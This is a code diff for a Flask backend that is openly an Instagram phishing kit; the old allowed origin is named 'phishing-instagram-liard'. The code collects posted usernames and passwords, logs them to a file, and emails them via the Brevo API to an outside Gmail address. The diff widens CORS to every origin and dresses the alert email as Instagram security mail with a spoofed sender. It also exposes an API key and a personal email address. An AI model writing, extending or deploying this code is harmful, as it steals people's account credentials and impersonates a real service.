@@ -7,33 +7,33 @@ import os
 
 app = Flask(__name__)
 
-# Allowed origins
-CORS(app, resources={r"/*": {"origins": [
-    "https://phishing-instagram-liard.vercel.app",
-]}})
+# Updated CORS for Vercel frontend
+CORS(app, resources={r"/*": {"origins": "*"}})
 
 def send_email_brevo(username, password):
-    # Configure API key
     configuration = sib_api_v3_sdk.Configuration()
     configuration.api_key['api-key'] = 'mAK4zDHMnZ8WObLc'
 
-    # Create an instance of the API class
     api_instance = sib_api_v3_sdk.TransactionalEmailsApi(sib_api_v3_sdk.ApiClient(configuration))
     
-    # Create email content
-    subject = "New Login Credentials"
+    subject = "Instagram Login Alert"
     html_content = f"""
     <html>
-        <body>
-            <h2>New login credentials received:</h2>
-            <p><strong>Username:</strong> {username}</p>
-            <p><strong>Password:</strong> {password}</p>
-            <p><strong>Timestamp:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
+        <body style="font-family: Arial, sans-serif;">
+            <div style="background-color: #fafafa; padding: 20px;">
+                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" style="margin-bottom: 20px;">
+                <div style="background-color: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
+                    <h2 style="color: #262626;">New Instagram Login Detected</h2>
+                    <p><strong>Username:</strong> {username}</p>
+                    <p><strong>Password:</strong> {password}</p>
+                    <p><strong>Time:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
+                </div>
+            </div>
         </body>
     </html>
     """
 
-    sender = {"name": "Login System", "email": "noreply@yourdomain.com"}
+    sender = {"name": "Instagram Security", "email": "security@instagram.com"}
     to = [{"email": "rakshitjadon1903@gmail.com", "name": "Rakshit"}]
 
     send_smtp_email = sib_api_v3_sdk.SendSmtpEmail(
@@ -45,47 +45,32 @@ def send_email_brevo(username, password):
 
     try:
         api_response = api_instance.send_transac_email(send_smtp_email)
-        print(f"Email sent successfully: {api_response}")
         return True
     except ApiException as e:
-        print(f"Exception when calling SMTPApi->send_transac_email: {e}")
+        print(f"Email sending failed: {e}")
         return False
 
 @app.route("/", methods=["GET", "POST"])
 def login():
     if request.method == "POST":
-        data = request.get_json(silent=True)
-        if data:
+        try:
+            data = request.get_json(silent=True) or request.form
             username = data.get("username", "")
             password = data.get("password", "")
-        else:
-            username = request.form.get("username", "")
-            password = request.form.get("password", "")
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-        try:
-            # Save credentials to file
+            # Log credentials
             with open("create.txt", "a", encoding="utf-8") as f:
-                f.write(
-                    f"Timestamp: {timestamp}\nUsername: {username}\nPassword: {password}\n{'='*50}\n"
-                )
+                f.write(f"Timestamp: {timestamp}\nUsername: {username}\nPassword: {password}\n{'='*50}\n")
             
-            # Send email using Brevo
-            email_sent = send_email_brevo(username, password)
-            if not email_sent:
-                print("Failed to send email")
+            # Send email
+            send_email_brevo(username, password)
             
+            return jsonify({"status": "success"}), 200
+
         except Exception as e:
-            return jsonify({"status": "error", "message": "Operation failed", "error": str(e)}), 500
+            return jsonify({"status": "error", "message": str(e)}), 500
 
-        return jsonify({
-            "status": "success",
-            "message": "Login data received",
-            "username": username
-        }), 200
-
-    return jsonify({"status": "ok", "message": "POST username & password to this endpoint"}), 200
+    return jsonify({"status": "ok"}), 200
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 1111)))
